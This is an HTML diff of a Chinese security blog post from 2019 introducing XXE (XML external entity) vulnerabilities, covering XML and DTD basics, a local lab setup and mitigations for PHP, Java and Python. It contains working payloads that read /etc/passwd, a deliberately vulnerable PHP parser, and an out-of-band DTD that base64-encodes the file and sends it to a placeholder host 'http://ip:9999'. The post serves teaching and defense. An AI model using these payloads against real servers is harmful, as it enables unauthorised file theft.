@@ -1,0 +1,93 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="author" content="John Doe"><link rel="alternative" href="/atom.xml" title="木肃的博客" type="application/atom+xml"><link rel="icon" href="/favicon.png"><title>xxe漏洞之简单了解 - 木肃的博客</title><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css"><!--[if lt IE 9]><script>(function(a,b){a="abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video".split(" ");for(b=a.length-1;b>=0;b--)document.createElement(a[b])})()</script><![endif]--><script src="/js/jquery-3.1.1.min.js"></script><script src="/js/fancybox/jquery.fancybox.min.js"></script></head><body style="opacity:0"><header class="head"><h1 class="head-title u-fl"><a href="/">木肃的博客</a></h1><nav class="head-nav u-fr"><ul class="head-nav__list"><li class="head-nav__item"><a class="head-nav__link" href="/archives">目录</a></li></ul></nav></header><main class="main"><article class="post"><header class="post__head"> <time class="post__time" datetime="2019-02-24T13:26:41.000Z">二月 24, 2019</time><h1 class="post__title"><a href="/2019/02/24/XXE漏洞/">xxe漏洞之简单了解</a></h1><div class="post__main echo"><h1 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h1><p>针对于XXE漏洞，只需要了解XML基础以及DTD的编写</p>
+<h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
+<p><img src="/xxe笔记/xml01.png" alt=""></p>
+<p>上图是一个普通的xml文档，在图片中，</p>
+<ul>
+<li><p>第一行叫做文档声明</p>
+</li>
+<li><p>3-8行叫做文档类型定义（简称：DTD）</p>
+</li>
+<li><p>10-14行叫做文档元素，由DTD定义过的元素才能被xml文档理解，才能在这里使用</p>
+</li>
+</ul>
+<p>整个<code>learn.xml</code>文件在浏览器中显示如下图所示：</p>
+<p><img src="/xxe笔记/xml02.png" alt=""></p>
+<h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>DTD的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
+<h3 id="内部声明"><a href="#内部声明" class="headerlink" title="内部声明"></a>内部声明</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>
+<p>如：</p>
+<p><img src="/xxe笔记/dtd01.png" alt=""></p>
+<h3 id="外部引用"><a href="#外部引用" class="headerlink" title="外部引用"></a>外部引用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>如：</p>
+<p><img src="/xxe笔记/dtd02.png" alt=""></p>
+<h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量</p>
+<p><strong>第一种分类方式可以把实体分为内部实体或外部实体</strong></p>
+<p>内部实体和外部实体的引用方式都可以在文档元素中使用<code>&amp;实体名;</code>引用</p>
+<h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名 &quot;实体值&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/xxe笔记/dtd03.png" alt=""></p>
+<h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>XXE漏洞发生就发生在外部引用实体中，所以重点就是盯紧外部引用实体，其他的不用关心太多</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名 SYSTEM &quot;URI&quot;&gt;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY 实体名 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/xxe笔记/dtd04.png" alt=""></p>
+<p><strong>第二种分类方式可以分为普通实体和参数实体</strong></p>
+<p>普通实体的引用方式为：<code>&amp;实体名;</code></p>
+<p>参数实体只能在DTD文档类型定义中引用，引用方式为：<code>%实体名;</code></p>
+<h1 id="XXE漏洞攻击"><a href="#XXE漏洞攻击" class="headerlink" title="XXE漏洞攻击"></a>XXE漏洞攻击</h1><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害，本篇文章只介绍读取任意文件的攻击方式：</p>
+<p>由于实体的分类不同，<strong>恶意</strong>引入实体的方式可以有很多种：</p>
+<ol>
+<li><strong>内部声明DTD+普通实体</strong></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;c&gt;&amp;xxe;&lt;/c&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/xxe笔记/shiti01.png" alt=""></p>
+<p>2.<strong>内部声明DTD+参数实体</strong></p>
+<p>xml内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % b SYSTEM &quot;http://localhost/test.dtd&quot;&gt;</span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;c&gt;&amp;xxe;&lt;/c&gt;</span><br></pre></td></tr></table></figure>
+<p>dtd内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/xxe笔记/shiti02.png" alt=""></p>
+<p>3.<strong>外部引用DTD+普通实体</strong></p>
+<p>xml内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE a SYSTEM &quot;http://localhost/test.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;c&gt;&amp;xxe;&lt;/c&gt;</span><br></pre></td></tr></table></figure>
+<p>dtd内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/xxe笔记/shiti03.png" alt=""></p>
+<h2 id="实验：有回显获取数据"><a href="#实验：有回显获取数据" class="headerlink" title="实验：有回显获取数据"></a>实验：有回显获取数据</h2><p>本地搭建环境：</p>
+<blockquote>
+<p>源码参考自<a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p>
+</blockquote>
+<p>xml.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (false);</span><br><span class="line">    $xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    echo $creds;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE a [  </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;a&gt;&amp;xxe;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>效果如图所示：</p>
+<p><img src="/xxe笔记/xxe01.png" alt=""></p>
+<p>如果文件中包含特殊符号，则不能正常读取文件，这时候就需要用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[</span><br><span class="line">    xxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure>
+<p>来读取文件了，需要用上面的结构包住要读取的内容，在拼接以后再在 xml 中调用，那么要想在 DTD<br>中拼接，我们只有一种选择，就是使用 参数实体</p>
+<p>使用下面的payload读取服务器上的含有特殊字符的文件：<code>test.txt</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///var/www/html/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line">&lt;a&gt;&amp;all;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>由于是本地搭建，所以引用的外部DTD文件是在我本机上的，实际操作过程中，应使用公网ip</p>
+<p>evil.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>在演示过程中，我在本机开启phpstudy，在根目录创建了evil.dtd，然后在浏览器使用上面的payload访问目标网址，成功读取<code>test.txt</code>文件内容</p>
+<p><img src="/xxe笔记/xxe02.png" alt=""></p>
+<p>实际测试后发现，还是有些东西读不出来，比如尖括号<code>&lt;adsf&gt;</code>和<code>&lt;jsjsks&gt;</code>等内容，所以这个方法也不太好</p>
+<h2 id="实验：无回显获取数据"><a href="#实验：无回显获取数据" class="headerlink" title="实验：无回显获取数据"></a>实验：无回显获取数据</h2><p>在实际测试过程中会发现，大部分网站人家的xml本身就不是用来输出的，因此我们需要不通过回显获取想要的数据，这个时候就需要把数据发送到远程服务器上了</p>
+<p>xml.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>我们需要构造payload去请求一个远程服务器的dtd文档</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/tmp.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<p>tmp.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://ip:9999/%data;&apos;&gt;&quot;&gt;</span><br><span class="line">%init;%send;</span><br></pre></td></tr></table></figure>
+<p>%init 调用 test.dtd 中的 %data, %data 就会去获取服务器上面的敏感文件，然后将 %data 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html16进制实体编码 <code>&amp;#x25;</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程服务器上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
+<h1 id="XXE漏洞防御"><a href="#XXE漏洞防御" class="headerlink" title="XXE漏洞防御"></a>XXE漏洞防御</h1><p>使用语言中推荐的禁用外部实体的方法</p>
+<p>PHP：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
+<p>JAVA：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>,<span class="keyword">false</span>)</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+<p>Python：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="keyword">False</span>))</span><br></pre></td></tr></table></figure>
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>XXE能实现的攻击有很多种，本文只讲解了其中一种，在学习过程中，是挺懵的，看了大佬的文章，佩服大佬的技术与文笔，在写笔记的过程中，多多少少参考了以下的几篇文章</p>
+<p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">先知社区—-一篇文章带你深入理解漏洞之 XXE 漏洞</a></p>
+<p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">TSRC—-未知攻焉知防——XXE漏洞攻防</a></p>
+<p><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">nMask’s Blog—-浅谈XXE漏洞攻击与防御</a></p>
+</div></header></article><div class="comments" id="lv-container" data-id="city" data-uid="your uid"><script>(function(d, s) {var j, e = d.getElementsByTagName(s)[0];if (typeof LivereTower === 'function') { return; } j = d.createElement(s);j.src = 'https://cdn-city.livere.com/js/embed.dist.js';j.async = true;e.parentNode.insertBefore(j, e);})(document, 'script');</script></div></main><footer class="foot"><div class="foot-copy">&copy; 2016-2019 John Doe</div></footer><script src="/js/scroller.js"></script><script src="/js/main.js"></script></body></html>
